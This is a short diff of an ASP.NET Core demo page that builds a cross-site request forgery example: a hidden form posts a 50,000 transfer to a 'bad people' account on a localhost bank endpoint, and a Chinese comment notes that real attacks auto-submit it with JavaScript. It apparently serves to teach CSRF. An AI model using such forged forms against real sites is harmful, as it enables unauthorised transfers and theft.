@@ -9,10 +9,10 @@
     <p>Learn about <a href="https://docs.microsoft.com/aspnet/core">building Web apps with ASP.NET Core</a>.</p>
     
     <div>
-        <p>隐藏式表单执行转账</p>
-        <form action="https://localhost:7167/Account/Transfer" method="post">
-            <label>账号：<input type="hidden" name="name" vale="坏人" /></label>
-            <label>金额：<input type="hidden" name="amount" vale="50000" /></label>
+        <p>表单执行转账（真正攻击可以用 js 代码自动提交）</p>
+        <form action="https://localhost:7167/Bank/Transfer" method="post">
+            <label>账号：<input type="hidden" name="toUserName" value="bad people" /></label>
+            <label>金额：<input type="hidden" name="amount" value="50000" /></label>
             <input type="submit" value="提交" />
         </form>
     </div>
